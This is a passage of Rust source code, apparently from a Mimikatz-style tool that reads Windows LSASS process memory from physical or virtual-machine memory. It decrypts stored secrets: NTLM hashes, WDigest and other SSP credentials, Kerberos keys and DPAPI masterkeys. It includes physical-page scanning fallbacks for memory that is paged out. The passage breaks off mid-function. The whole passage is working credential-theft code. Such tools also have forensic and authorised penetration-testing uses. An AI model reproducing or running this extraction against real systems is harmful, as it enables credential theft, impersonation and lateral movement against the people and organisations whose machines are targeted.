use std::fmt;

use crate::error::{VmkatzError, Result};
use crate::lsass::crypto::{self, CryptoKeys};
use crate::lsass::types::{Credential, KerberosCredential, KerberosKey, MsvCredential};
use crate::memory::{PhysicalMemory, VirtualMemory};
use crate::paging::translate::{PageTableWalker, PaeProcessMemory, ProcessMemory};
use crate::lsass::types::Arch;
use crate::windows::offsets::{EprocessOffsets, WindowsBitness, X64_LDR};
use crate::windows::peb::{self, LoadedModule};
use crate::windows::process::Process;

/// KUSER_SHARED_DATA.NtBuildNumber (mapped at 0x7FFE0000 in all user processes).
const KUSER_NT_BUILD_NUMBER: u64 = 0x7FFE_0260;

/// Status of an SSP provider extraction attempt.
#[derive(Clone, Copy, PartialEq)]
enum ProviderStatus {
    Ok,
    Paged,
    Empty,
    NotAvailable,
}

impl ProviderStatus {
    fn from_result_empty(is_empty: bool) -> Self {
        if is_empty { Self::Empty } else { Self::Ok }
    }
}

impl fmt::Display for ProviderStatus {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Ok => f.write_str("ok"),
            Self::Paged => f.write_str("paged"),
            Self::Empty => f.write_str("empty"),
            Self::NotAvailable => f.write_str("n/a"),
        }
    }
}

use super::types::{read_u16_le, read_u32_le, read_u64_le};

/// Provider status tracking for all 9 SSP providers.
struct ProviderStatuses {
    msv: ProviderStatus,
    wdigest: ProviderStatus,
    kerberos: ProviderStatus,
    tspkg: ProviderStatus,
    dpapi: ProviderStatus,
    ssp: ProviderStatus,
    livessp: ProviderStatus,
    credman: ProviderStatus,
    cloudap: ProviderStatus,
}

impl ProviderStatuses {
    fn new(dlls: &LsassDlls<'_>) -> Self {
        Self {
            msv: ProviderStatus::Paged,
            wdigest: ProviderStatus::Paged,
            kerberos: ProviderStatus::Paged,
            tspkg: ProviderStatus::Paged,
            dpapi: ProviderStatus::Paged,
            ssp: ProviderStatus::Empty,
            livessp: if dlls.livessp.is_some() { ProviderStatus::Paged } else { ProviderStatus::NotAvailable },
            credman: ProviderStatus::Paged,
            cloudap: if dlls.cloudap.is_some() { ProviderStatus::Paged } else { ProviderStatus::NotAvailable },
        }
    }

    fn print_summary(&self) {
        println!(
            "[*] Providers: MSV({}) WDigest({}) Kerberos({}) TsPkg({}) DPAPI({}) SSP({}) LiveSSP({}) Credman({}) CloudAP({})",
            self.msv, self.wdigest, self.kerberos, self.tspkg, self.dpapi,
            self.ssp, self.livessp, self.credman, self.cloudap,
        );
    }
}

/// DLLs loaded in LSASS that we need to locate.
pub struct LsassDlls<'a> {
    pub lsasrv: Option<&'a LoadedModule>,
    pub msv1_0: Option<&'a LoadedModule>,
    pub wdigest: Option<&'a LoadedModule>,
    pub kerberos: Option<&'a LoadedModule>,
    pub tspkg: Option<&'a LoadedModule>,
    pub livessp: Option<&'a LoadedModule>,
    pub cloudap: Option<&'a LoadedModule>,
    pub dpapisrv: Option<&'a LoadedModule>,
}

impl<'a> LsassDlls<'a> {
    fn from_modules(modules: &'a [LoadedModule]) -> Self {
        Self {
            lsasrv: find_module(modules, "lsasrv.dll"),
            msv1_0: find_module(modules, "msv1_0.dll"),
            wdigest: find_module(modules, "wdigest.dll"),
            kerberos: find_module(modules, "kerberos.dll"),
            tspkg: find_module(modules, "tspkg.dll"),
            livessp: find_module(modules, "livessp.dll"),
            cloudap: find_module(modules, "cloudap.dll"),
            dpapisrv: find_module(modules, "dpapisrv.dll"),
        }
    }
}

/// Insert MSV session metadata into the credential map.
fn insert_sessions(
    all_creds: &mut std::collections::HashMap<u64, Credential>,
    sessions: Vec<crate::lsass::msv::MsvSessionInfo>,
) {
    for sess in sessions {
        let luid = sess.luid;
        all_creds.entry(luid).or_insert_with(|| {
            let mut c = Credential::new_empty(luid, sess.username, sess.domain);
            c.logon_type = sess.logon_type;
            c.session_id = sess.session_id;
            c.logon_time = sess.logon_time;
            c.logon_server = sess.logon_server;
            c.sid = sess.sid;
            c
        });
    }
}

/// Extract credentials from the 6 "simple" providers (no fallback paths).
/// Handles: WDigest, TsPkg, SSP, LiveSSP, Credman, CloudAP.
fn extract_simple_providers(
    vmem: &dyn VirtualMemory,
    dlls: &LsassDlls<'_>,
    keys: &CryptoKeys,
    arch: Arch,
    all_creds: &mut std::collections::HashMap<u64, Credential>,
    status: &mut ProviderStatuses,
) {
    // WDigest
    if let Some(wd) = &dlls.wdigest {
        match crate::lsass::wdigest::extract_wdigest_credentials_arch(vmem, wd.base, wd.size, keys, arch) {
            Ok(creds) => {
                status.wdigest = ProviderStatus::from_result_empty(creds.is_empty());
                for (luid, wd_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, wd_cred.username.clone(), wd_cred.domain.clone())
                    });
                    entry.wdigest = Some(wd_cred);
                }
            }
            Err(e) => log::info!("WDigest extraction failed: {}", e),
        }
    }

    // TsPkg
    if let Some(ts) = &dlls.tspkg {
        match crate::lsass::tspkg::extract_tspkg_credentials_arch(vmem, ts.base, ts.size, keys, arch) {
            Ok(creds) => {
                status.tspkg = ProviderStatus::from_result_empty(creds.is_empty());
                for (luid, ts_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, ts_cred.username.clone(), ts_cred.domain.clone())
                    });
                    entry.tspkg = Some(ts_cred);
                }
            }
            Err(e) => log::info!("TsPkg extraction failed: {}", e),
        }
    }

    // SSP (uses msv1_0.dll)
    if let Some(msv) = &dlls.msv1_0 {
        match crate::lsass::ssp::extract_ssp_credentials_arch(vmem, msv.base, msv.size, keys, arch) {
            Ok(creds) => {
                status.ssp = ProviderStatus::from_result_empty(creds.is_empty());
                for (luid, ssp_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, ssp_cred.username.clone(), ssp_cred.domain.clone())
                    });
                    entry.ssp = Some(ssp_cred);
                }
            }
            Err(e) => log::debug!("SSP extraction: {}", e),
        }
    }

    // LiveSSP
    if let Some(live) = &dlls.livessp {
        match crate::lsass::livessp::extract_livessp_credentials_arch(vmem, live.base, live.size, keys, arch) {
            Ok(creds) => {
                status.livessp = ProviderStatus::from_result_empty(creds.is_empty());
                for (luid, live_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, live_cred.username.clone(), live_cred.domain.clone())
                    });
                    entry.livessp = Some(live_cred);
                }
            }
            Err(e) => log::info!("LiveSSP extraction failed: {}", e),
        }
    }

    // Credman (uses msv1_0.dll)
    if let Some(msv) = &dlls.msv1_0 {
        match crate::lsass::credman::extract_credman_credentials_arch(vmem, msv.base, msv.size, keys, arch) {
            Ok(creds) => {
                status.credman = ProviderStatus::from_result_empty(creds.is_empty());
                for (luid, cm_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, cm_cred.username.clone(), cm_cred.domain.clone())
                    });
                    entry.credman.push(cm_cred);
                }
            }
            Err(e) => log::info!("Credman extraction failed: {}", e),
        }
    }

    // CloudAP
    if let Some(cap) = &dlls.cloudap {
        match crate::lsass::cloudap::extract_cloudap_credentials_arch(vmem, cap.base, cap.size, keys, arch) {
            Ok(creds) => {
                status.cloudap = ProviderStatus::from_result_empty(creds.is_empty());
                for (luid, cap_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, cap_cred.username.clone(), cap_cred.domain.clone())
                    });
                    entry.cloudap = Some(cap_cred);
                }
            }
            Err(e) => log::info!("CloudAP extraction failed: {}", e),
        }
    }
}

/// Extract DPAPI credentials from DLLs (lsasrv first, then dpapisrv fallback).
fn extract_dpapi_from_dlls(
    vmem: &dyn VirtualMemory,
    lsasrv: &LoadedModule,
    dpapisrv: Option<&LoadedModule>,
    keys: &CryptoKeys,
    arch: Arch,
) -> Vec<(u64, crate::lsass::types::DpapiCredential)> {
    let dpapi_dlls: Vec<(&str, u64, u32)> = [
        Some(("lsasrv.dll", lsasrv.base, lsasrv.size)),
        dpapisrv.map(|d| ("dpapisrv.dll", d.base, d.size)),
    ]
    .into_iter()
    .flatten()
    .collect();

    for (dll_name, dll_base, dll_size) in &dpapi_dlls {
        match crate::lsass::dpapi::extract_dpapi_credentials_arch(vmem, *dll_base, *dll_size, keys, arch) {
            Ok(creds) if !creds.is_empty() => {
                log::info!("DPAPI: found {} masterkeys in {}", creds.len(), dll_name);
                return creds;
            }
            Ok(_) => log::info!("DPAPI: {} returned empty", dll_name),
            Err(e) => log::info!("DPAPI extraction from {} failed: {}", dll_name, e),
        }
    }
    Vec::new()
}

/// Insert DPAPI credentials into the credential map.
fn insert_dpapi_creds(
    all_creds: &mut std::collections::HashMap<u64, Credential>,
    dpapi_creds: Vec<(u64, crate::lsass::types::DpapiCredential)>,
) {
    for (luid, dpapi_cred) in dpapi_creds {
        let entry = all_creds
            .entry(luid)
            .or_insert_with(|| Credential::new_empty(luid, String::new(), String::new()));
        entry.dpapi.push(dpapi_cred);
    }
}

/// Assign Kerberos key groups to credentials by matching RC4 keys to NT hashes.
fn assign_kerberos_key_groups(
    all_creds: &mut std::collections::HashMap<u64, Credential>,
    key_groups: Vec<Vec<KerberosKey>>,
) {
    let nt_to_luid: Vec<([u8; 16], u64)> = all_creds
        .iter()
        .filter_map(|(&luid, c)| c.msv.as_ref().map(|m| (m.nt_hash, luid)))
        .collect();

    let mut unassigned: Vec<Vec<KerberosKey>> = Vec::new();

    for key_group in key_groups {
        let rc4_match = key_group.iter().find(|k| k.etype == 23).and_then(|k| {
            if k.key.len() == 16 {
                let mut hash = [0u8; 16];
                hash.copy_from_slice(&k.key);
                nt_to_luid.iter().find(|(h, _)| *h == hash).map(|(_, luid)| *luid)
            } else {
                None
            }
        });

        if let Some(luid) = rc4_match {
            if let Some(cred) = all_creds.get_mut(&luid) {
                if cred.kerberos.is_none() {
                    cred.kerberos = Some(KerberosCredential {
                        username: cred.username.clone(),
                        domain: cred.domain.clone(),
                        password: String::new(),
                        keys: key_group,
                        tickets: Vec::new(),
                    });
                } else if let Some(krb) = &mut cred.kerberos {
                    if krb.keys.is_empty() {
                        krb.keys = key_group;
                    }
                }
                continue;
            }
        }
        unassigned.push(key_group);
    }

    for key_group in unassigned {
        let target = all_creds.values_mut().find(|c| {
            c.kerberos.as_ref().is_some_and(|k| k.keys.is_empty())
        });
        if let Some(cred) = target {
            if let Some(krb) = &mut cred.kerberos {
                krb.keys = key_group;
            }
        }
    }
}

/// Fill well-known LUID names, sort by LUID.
fn finalize_credentials(
    mut all_creds: std::collections::HashMap<u64, Credential>,
) -> Vec<Credential> {
    for cred in all_creds.values_mut() {
        crate::lsass::types::fill_wellknown_luid(cred);
    }
    let mut result: Vec<Credential> = all_creds.into_values().collect();
    result.sort_by_key(|c| c.luid);
    result
}

/// Pagefile reference type: wraps Option<&PagefileReader> when sam feature is enabled,
/// or () when not. Allows a unified function signature across feature configurations.
#[cfg(feature = "sam")]
pub type PagefileRef<'a> = Option<&'a crate::paging::pagefile::PagefileReader>;
#[cfg(not(feature = "sam"))]
pub type PagefileRef<'a> = ();

/// Disk path reference type: wraps Option<&Path> when sam feature is enabled,
/// or () when not. Allows a unified function signature across feature configurations.
#[cfg(feature = "sam")]
pub type DiskPathRef<'a> = Option<&'a std::path::Path>;
#[cfg(not(feature = "sam"))]
pub type DiskPathRef<'a> = ();

/// Bitness-aware credential extraction: dispatches to x64, Win10 x86, or pre-Vista x86.
pub fn extract_all_credentials_auto<P: PhysicalMemory>(
    phys: &P,
    lsass: &Process,
    kernel_dtb: u64,
    offsets: &EprocessOffsets,
    pagefile: PagefileRef<'_>,
    disk_path: DiskPathRef<'_>,
) -> Result<Vec<Credential>> {
    match offsets.bitness {
        WindowsBitness::X64 => {
            extract_all_credentials(phys, lsass, kernel_dtb, pagefile, disk_path)
        }
        WindowsBitness::X86Pae => {
            if is_prevista_x86(offsets) {
                extract_prevista_credentials(phys, lsass)
            } else {
                extract_all_credentials_x86(phys, lsass)
            }
        }
    }
}

/// Determine if x86 EPROCESS offsets correspond to pre-Vista (WinXP/Win2003).
/// Pre-Vista x86 has PID at 0x84 (WinXP) or 0x94 (Win2003), Win10 x86 has PID >= 0xB4.
fn is_prevista_x86(offsets: &EprocessOffsets) -> bool {
    offsets.unique_process_id < 0xA0
}

/// Extract credentials from a pre-Vista 32-bit LSASS process.
/// Uses PAE page table walking and pre-Vista crypto (DES-X-CBC / RC4).
fn extract_prevista_credentials<P: PhysicalMemory>(
    phys: &P,
    lsass: &Process,
) -> Result<Vec<Credential>> {
    log::info!(
        "Pre-Vista LSASS: PID={}, DTB=0x{:x}, PEB=0x{:x}",
        lsass.pid, lsass.dtb, lsass.peb_vaddr
    );

    // Create 32-bit PAE virtual memory reader
    let vmem = PaeProcessMemory::new(phys, lsass.dtb);

    // Enumerate 32-bit DLLs
    let ldr_offsets = peb::X86_LDR;
    let modules = peb::enumerate_modules_32(&vmem, lsass.peb_vaddr, &ldr_offsets)?;

    log::info!("Pre-Vista LSASS: {} modules loaded", modules.len());
    for m in &modules {
        log::debug!("  0x{:08x} ({:8} bytes) {}", m.base, m.size, m.base_name);
    }

    // Find lsasrv.dll and msv1_0.dll
    let lsasrv = find_module(&modules, "lsasrv.dll");
    let msv1_0 = find_module(&modules, "msv1_0.dll");

    let lsasrv = lsasrv.ok_or_else(|| {
        VmkatzError::PatternNotFound("lsasrv.dll not found in pre-Vista LSASS".to_string())
    })?;

    // Extract pre-Vista crypto keys from lsasrv.dll
    let keys = crypto::extract_prevista_crypto_keys(&vmem, lsasrv.base, lsasrv.size as u64)?;
    println!("[+] Pre-Vista crypto keys extracted (DES-X + RC4)");

    let mut credentials = Vec::new();

    // MSV1_0: Extract NTLM hashes
    if let Some(msv) = msv1_0 {
        match crate::lsass::msv::extract_prevista_msv_credentials(
            &vmem, msv.base, msv.size as u64, &keys,
        ) {
            Ok(msv_creds) => {
                println!("[+] Pre-Vista MSV: {} credential(s) extracted", msv_creds.len());
                for (luid, msv_cred) in msv_creds {
                    let mut cred = Credential::new_empty(
                        luid,
                        msv_cred.username.clone(),
                        msv_cred.domain.clone(),
                    );
                    cred.msv = Some(msv_cred);
                    credentials.push(cred);
                }
            }
            Err(e) => {
                log::warn!("Pre-Vista MSV extraction failed: {}", e);
                println!("[-] Pre-Vista MSV: {}", e);
            }
        }
    } else {
        println!("[-] msv1_0.dll not found in pre-Vista LSASS");
    }

    // Pre-Vista has no DPAPI/TsPkg/CloudAP/SSP/LiveSSP/Credman in LSASS
    // WDigest + Kerberos: deferred to follow-up (different pre-Vista structures)
    if credentials.is_empty() {
        println!("[*] Pre-Vista: no credentials extracted (WDigest/Kerberos not yet supported)");
    }

    Ok(credentials)
}

/// Extract credentials from a Win10 x86 LSASS process.
/// Uses PAE page table walking with Vista+ AES/3DES crypto and all SSP providers.
fn extract_all_credentials_x86<P: PhysicalMemory>(
    phys: &P,
    lsass: &Process,
) -> Result<Vec<Credential>> {
    log::info!(
        "Win10 x86 LSASS: PID={}, DTB=0x{:x}, PEB=0x{:x}",
        lsass.pid, lsass.dtb, lsass.peb_vaddr
    );

    let arch = Arch::X86;

    // Create 32-bit PAE virtual memory reader
    let vmem = PaeProcessMemory::new(phys, lsass.dtb);

    // Enumerate 32-bit DLLs
    let ldr_offsets = peb::X86_LDR;
    let modules = peb::enumerate_modules_32(&vmem, lsass.peb_vaddr, &ldr_offsets)?;

    log::info!("Win10 x86 LSASS: {} modules loaded", modules.len());
    for m in &modules {
        log::debug!("  0x{:08x} ({:8} bytes) {}", m.base, m.size, m.base_name);
    }

    let dlls = LsassDlls::from_modules(&modules);

    let lsasrv = dlls
        .lsasrv
        .ok_or_else(|| VmkatzError::ProcessNotFound("lsasrv.dll not found in x86 LSASS".to_string()))?;

    // Read Windows build number from KUSER_SHARED_DATA (0x7FFE0000 on x86 too)
    let build_number = vmem
        .read_virt_u32(KUSER_NT_BUILD_NUMBER)
        .map(|v| v & 0xFFFF)
        .unwrap_or(0);
    log::info!("Windows x86 build number: {}", build_number);

    // Extract Vista+ crypto keys (AES/3DES) — same algorithm, x86 patterns
    let keys = crypto::extract_crypto_keys_x86(&vmem, lsasrv.base, lsasrv.size)?;

    let mut all_creds: std::collections::HashMap<u64, Credential> =
        std::collections::HashMap::new();
    let mut status = ProviderStatuses::new(&dlls);

    // MSV sessions + credentials
    if let Some(msv) = &dlls.msv1_0 {
        let mut sessions = crate::lsass::msv::extract_msv_sessions_arch(&vmem, msv.base, msv.size, build_number, arch);
        log::info!("MSV x86 sessions discovered: {}", sessions.len());
        if let Some(lsasrv_mod) = dlls.lsasrv {
            crate::lsass::msv::enrich_sessions_from_lsasrv(
                &vmem, lsasrv_mod.base, lsasrv_mod.size, &mut sessions, arch,
            );
        }
        insert_sessions(&mut all_creds, sessions);

        match crate::lsass::msv::extract_msv_credentials_arch(
            &vmem, msv.base, msv.size, &keys, build_number, arch,
        ) {
            Ok(msv_creds) => {
                status.msv = ProviderStatus::from_result_empty(msv_creds.is_empty());
                for (luid, msv_cred) in msv_creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, msv_cred.username.clone(), msv_cred.domain.clone())
                    });
                    entry.msv = Some(msv_cred);
                }
            }
            Err(e) => log::info!("MSV x86 extraction failed: {}", e),
        }
    }

    // Simple providers (WDigest, TsPkg, SSP, LiveSSP, Credman, CloudAP)
    extract_simple_providers(&vmem, &dlls, &keys, arch, &mut all_creds, &mut status);

    // Kerberos
    if let Some(krb) = &dlls.kerberos {
        match crate::lsass::kerberos::extract_kerberos_credentials_arch(
            &vmem, krb.base, krb.size, &keys, arch,
        ) {
            Ok(creds) => {
                status.kerberos = ProviderStatus::from_result_empty(creds.is_empty());
                for (luid, krb_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, krb_cred.username.clone(), krb_cred.domain.clone())
                    });
                    entry.kerberos = Some(krb_cred);
                }
            }
            Err(e) => log::info!("Kerberos x86 extraction failed: {}", e),
        }
    }

    // DPAPI (DLL chain + physical scan fallback)
    let mut dpapi_creds = extract_dpapi_from_dlls(&vmem, lsasrv, dlls.dpapisrv, &keys, arch);
    if dpapi_creds.is_empty() {
        log::info!("DPAPI x86: standard extraction found nothing, trying physical scan...");
        dpapi_creds = crate::lsass::dpapi::extract_dpapi_physical_scan_x86(phys, lsass.dtb, &vmem, &keys);
    }
    status.dpapi = ProviderStatus::from_result_empty(dpapi_creds.is_empty());
    insert_dpapi_creds(&mut all_creds, dpapi_creds);

    status.print_summary();
    Ok(finalize_credentials(all_creds))
}

/// Find LSASS and extract all credentials.
/// When a pagefile reader is provided, paged-out memory is resolved from disk.
/// When a disk path is provided, demand-paged DLL sections are resolved from DLL files.
#[allow(clippy::let_unit_value, clippy::unit_arg)]
pub fn extract_all_credentials<P: PhysicalMemory>(
    phys: &P,
    lsass: &Process,
    _kernel_dtb: u64,
    pagefile: PagefileRef<'_>,
    disk_path: DiskPathRef<'_>,
) -> Result<Vec<Credential>> {
    // Create initial virtual memory reader for module enumeration
    #[cfg(feature = "sam")]
    let lsass_vmem_init = ProcessMemory::with_resolvers(phys, lsass.dtb, pagefile, None);
    #[cfg(not(feature = "sam"))]
    let lsass_vmem_init = {
        let _ = pagefile;
        let _ = disk_path;
        ProcessMemory::new(phys, lsass.dtb)
    };

    log::info!(
        "LSASS: PID={}, DTB=0x{:x}, PEB=0x{:x}",
        lsass.pid,
        lsass.dtb,
        lsass.peb_vaddr
    );

    // Enumerate DLLs in LSASS
    let modules = peb::enumerate_modules(&lsass_vmem_init, lsass.peb_vaddr, &X64_LDR)?;

    log::debug!("LSASS modules:");
    for m in &modules {
        log::debug!("  0x{:016x} ({:8} bytes) {}", m.base, m.size, m.base_name);
    }

    // Build file-backed resolver from disk to serve demand-paged DLL sections
    #[cfg(feature = "sam")]
    let filebacked = disk_path.and_then(|p| {
        match crate::paging::filebacked::FileBackedResolver::from_disk_and_modules(p, &modules) {
            Ok(fb) if fb.section_count() > 0 => {
                log::info!(
                    "File-backed: {} sections, {:.1} MB from {} DLLs",
                    fb.section_count(),
                    fb.total_bytes() as f64 / (1024.0 * 1024.0),
                    modules.len()
                );
                Some(fb)
            }
            Ok(_) => {
                log::info!("File-backed: no DLL sections loaded from disk");
                None
            }
            Err(e) => {
                log::info!("File-backed resolver failed: {}", e);
                None
            }
        }
    });

    // Create enhanced vmem with file-backed resolution for DLL sections
    #[cfg(feature = "sam")]
    let lsass_vmem = ProcessMemory::with_resolvers(phys, lsass.dtb, pagefile, filebacked.as_ref());
    #[cfg(not(feature = "sam"))]
    let lsass_vmem = lsass_vmem_init;

    let dlls = LsassDlls::from_modules(&modules);

    // Extract crypto keys from lsasrv.dll
    let lsasrv = dlls
        .lsasrv
        .ok_or_else(|| VmkatzError::ProcessNotFound("lsasrv.dll not found in LSASS".to_string()))?;

    // Read Windows build number from KUSER_SHARED_DATA (always at VA 0x7FFE0000)
    let build_number = lsass_vmem
        .read_virt_u32(KUSER_NT_BUILD_NUMBER)
        .map(|v| v & 0xFFFF) // Low 16 bits = build number
        .unwrap_or(0);
    log::info!("Windows build number: {}", build_number);

    let keys = match crypto::extract_crypto_keys(&lsass_vmem, lsasrv.base, lsasrv.size) {
        Ok(k) => k,
        Err(e) => {
            log::info!("Standard crypto extraction failed: {}", e);
            log::info!("Trying physical UUUR scan for BCRYPT handles...");
            crypto::extract_crypto_keys_physical_scan(
                phys,
                &lsass_vmem,
                lsass.dtb,
                lsasrv.base,
                lsasrv.size,
            )?
        }
    };

    let mut all_creds: std::collections::HashMap<u64, Credential> =
        std::collections::HashMap::new();
    let mut status = ProviderStatuses::new(&dlls);

    // MSV sessions + enrichment
    if let Some(msv) = &dlls.msv1_0 {
        let mut sessions = crate::lsass::msv::extract_msv_sessions_arch(&lsass_vmem, msv.base, msv.size, build_number, Arch::X64);
        log::info!("MSV sessions discovered: {}", sessions.len());
        if let Some(lsasrv_ref) = dlls.lsasrv {
            crate::lsass::msv::enrich_sessions_from_lsasrv(
                &lsass_vmem, lsasrv_ref.base, lsasrv_ref.size, &mut sessions, Arch::X64,
            );
        }
        insert_sessions(&mut all_creds, sessions);
    }

    // MSV credentials (with physical scan fallback)
    if let Some(msv) = &dlls.msv1_0 {
        let msv_creds = match crate::lsass::msv::extract_msv_credentials_arch(
            &lsass_vmem, msv.base, msv.size, &keys, build_number, Arch::X64,
        ) {
            Ok(creds) if !creds.is_empty() => creds,
            Ok(_) => {
                log::info!("MSV: Standard extraction found nothing, trying physical LUID scan...");
                scan_phys_for_msv_credentials(phys, lsass.dtb, &lsass_vmem, msv.base, msv.size, &keys, Arch::X64)
            }
            Err(e) => {
                log::info!("MSV extraction failed: {}, trying physical scan...", e);
                scan_phys_for_msv_credentials(phys, lsass.dtb, &lsass_vmem, msv.base, msv.size, &keys, Arch::X64)
            }
        };
        if !msv_creds.is_empty() {
            status.msv = ProviderStatus::Ok;
        }
        let mut next_synth_luid = 0x8000_0000_0000_0000u64;
        for (luid, msv_cred) in msv_creds {
            let effective_luid = if luid == 0 {
                all_creds
                    .iter()
                    .find(|(_, c)| {
                        let name_match = c.username.eq_ignore_ascii_case(&msv_cred.username);
                        let domain_match = msv_cred.domain.is_empty()
                            || msv_cred.domain == "."
                            || c.domain.eq_ignore_ascii_case(&msv_cred.domain);
                        name_match && domain_match && c.msv.is_none()
                    })
                    .map(|(&k, _)| k)
                    .unwrap_or_else(|| {
                        let synth = next_synth_luid;
                        next_synth_luid += 1;
                        synth
                    })
            } else {
                luid
            };
            let entry = all_creds.entry(effective_luid).or_insert_with(|| {
                Credential::new_empty(effective_luid, msv_cred.username.clone(), msv_cred.domain.clone())
            });
            entry.msv = Some(msv_cred);
        }
    }

    // Simple providers (WDigest, TsPkg, SSP, LiveSSP, Credman, CloudAP)
    extract_simple_providers(&lsass_vmem, &dlls, &keys, Arch::X64, &mut all_creds, &mut status);

    // Kerberos (with physical scan + key scan fallbacks)
    if let Some(krb) = &dlls.kerberos {
        let krb_creds = match crate::lsass::kerberos::extract_kerberos_credentials_arch(
            &lsass_vmem, krb.base, krb.size, &keys, Arch::X64,
        ) {
            Ok(creds) if !creds.is_empty() => creds,
            Ok(_) | Err(_) => {
                log::info!("Kerberos: AVL table walk found nothing, trying physical scan...");
                let known_users: std::collections::HashSet<(String, String)> = all_creds
                    .values()
                    .map(|c| (c.username.to_lowercase(), c.domain.to_lowercase()))
                    .collect();
                scan_phys_for_kerberos_credentials(phys, lsass.dtb, &lsass_vmem, &keys, &known_users)
            }
        };
        if !krb_creds.is_empty() {
            status.kerberos = ProviderStatus::Ok;
        }
        let has_keys = krb_creds.iter().any(|(_, k)| !k.keys.is_empty());

        for (luid, krb_cred) in krb_creds {
            let effective_luid = if luid == 0 {
                all_creds
                    .iter()
                    .find(|(_, c)| {
                        c.username.eq_ignore_ascii_case(&krb_cred.username)
                            && c.domain.eq_ignore_ascii_case(&krb_cred.domain)
                            && c.kerberos.is_none()
                    })
                    .map(|(&k, _)| k)
                    .unwrap_or(luid)
            } else {
                luid
            };
            let entry = all_creds.entry(effective_luid).or_insert_with(|| {
                Credential::new_empty(effective_luid, krb_cred.username.clone(), krb_cred.domain.clone())
            });
            entry.kerberos = Some(krb_cred);
        }

        if !has_keys {
            let key_groups = scan_phys_for_kerberos_keys(phys, lsass.dtb, &lsass_vmem, &keys);
            if !key_groups.is_empty() {
                status.kerberos = ProviderStatus::Ok;
                assign_kerberos_key_groups(&mut all_creds, key_groups);
            }
        }
    }

    // DPAPI (DLL chain + physical scan fallback)
    let mut dpapi_creds = extract_dpapi_from_dlls(&lsass_vmem, lsasrv, dlls.dpapisrv, &keys, Arch::X64);
    if dpapi_creds.is_empty() {
        log::info!("DPAPI: standard extraction found nothing, trying physical scan...");
        dpapi_creds = crate::lsass::dpapi::extract_dpapi_physical_scan(phys, lsass.dtb, &lsass_vmem, &keys);
    }
    status.dpapi = ProviderStatus::from_result_empty(dpapi_creds.is_empty());
    insert_dpapi_creds(&mut all_creds, dpapi_creds);

    status.print_summary();
    #[cfg(feature = "sam")]
    if let Some(fb) = &filebacked {
        let resolved = fb.pages_resolved();
        if resolved > 0 {
            println!("[+] File-backed: {} DLL pages resolved from disk", resolved);
        }
    }

    // Merge MSV credentials with unknown LUID (0) into matching session
    if let Some(orphan) = all_creds.remove(&0) {
        if let Some(msv_cred) = orphan.msv {
            let cred_user = msv_cred.username.to_lowercase();
            let cred_domain = msv_cred.domain.to_lowercase();
            let mut best_luid: Option<u64> = None;
            let mut best_logon_type: u32 = 0;
            for cred in all_creds.values() {
                let matches = if cred_domain.is_empty() {
                    cred.username.to_lowercase() == cred_user
                } else {
                    cred.username.to_lowercase() == cred_user && cred.domain.to_lowercase() == cred_domain
                };
                if matches {
                    let priority = if cred.logon_type == 2 { 3 } else if cred.logon_type != 0 { 2 } else { 1 };
                    let best_priority = if best_logon_type == 2 { 3 } else if best_logon_type != 0 { 2 } else { 1 };
                    if best_luid.is_none() || priority > best_priority {
                        best_luid = Some(cred.luid);
                        best_logon_type = cred.logon_type;
                    }
                }
            }
            let mut msv_opt = Some(msv_cred);
            if let Some(target_luid) = best_luid {
                if let Some(cred) = all_creds.get_mut(&target_luid) {
                    cred.msv = msv_opt.take();
                    log::debug!("Merged MSV credential into LUID 0x{:x}", cred.luid);
                }
            }
            if let Some(msv_cred) = msv_opt {
                let username = msv_cred.username.clone();
                let domain = msv_cred.domain.clone();
                all_creds.insert(0, Credential {
                    username, domain,
                    msv: Some(msv_cred),
                    wdigest: orphan.wdigest,
                    kerberos: orphan.kerberos,
                    tspkg: orphan.tspkg,
                    dpapi: orphan.dpapi,
                    credman: orphan.credman,
                    ssp: orphan.ssp,
                    livessp: orphan.livessp,
                    cloudap: orphan.cloudap,
                    ..Credential::default()
                });
            }
        }
    }

    Ok(finalize_credentials(all_creds))
}

/// Scan LSASS physical pages for KIWI_MSV1_0_PRIMARY_CREDENTIALS structures.
///
/// Instead of trying to find LogonSessionList (which requires .text patterns that
/// are often paged out), we directly scan for the credential structure signature:
///   +0x00: next (PVOID, 0 or heap ptr)
///   +0x08: Primary (ANSI_STRING: Length=7, MaxLength=8 for "Primary")
///   +0x18: Credentials (UNICODE_STRING: encrypted blob)
///
/// The distinctive signature is bytes 07 00 08 00 at offset +0x08.
fn scan_phys_for_msv_credentials<P: PhysicalMemory>(
    phys: &P,
    lsass_dtb: u64,
    vmem: &dyn VirtualMemory,
    _msv_base: u64,
    _msv_size: u32,
    keys: &CryptoKeys,
    arch: Arch,
) -> Vec<(u64, MsvCredential)> {
    let walker = PageTableWalker::new(phys);
    let mut results = Vec::new();
    let mut pages_scanned = 0u64;
    let mut candidates_found = 0u64;

    log::info!("MSV physical scan: searching for Primary credential structures in LSASS pages...");

    // Collect all candidate (vaddr, paddr) pairs for KIWI_MSV1_0_PRIMARY_CREDENTIALS
    let mut cred_candidates: Vec<(u64, u64)> = Vec::new(); // (vaddr of struct, paddr)

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return;
        }
        pages_scanned += 1;

        let page_data = match phys.read_phys_bytes(mapping.paddr, 0x1000) {
            Ok(d) => d,
            Err(_) => return,
        };

        // Skip zero pages
        if page_data.iter().all(|&b| b == 0) {
            return;
        }

        // Scan for ANSI_STRING signature: Length=7 (0x0007), MaxLength=8 (0x0008)
        // This appears at offset +0x08 in KIWI_MSV1_0_PRIMARY_CREDENTIALS
        // So we search for 07 00 08 00 at 8-byte aligned positions
        for off in (0..0x1000usize - 0x28).step_by(8) {
            // Check for 07 00 08 00 pattern
            if page_data[off] != 0x07
                || page_data[off + 1] != 0x00
                || page_data[off + 2] != 0x08
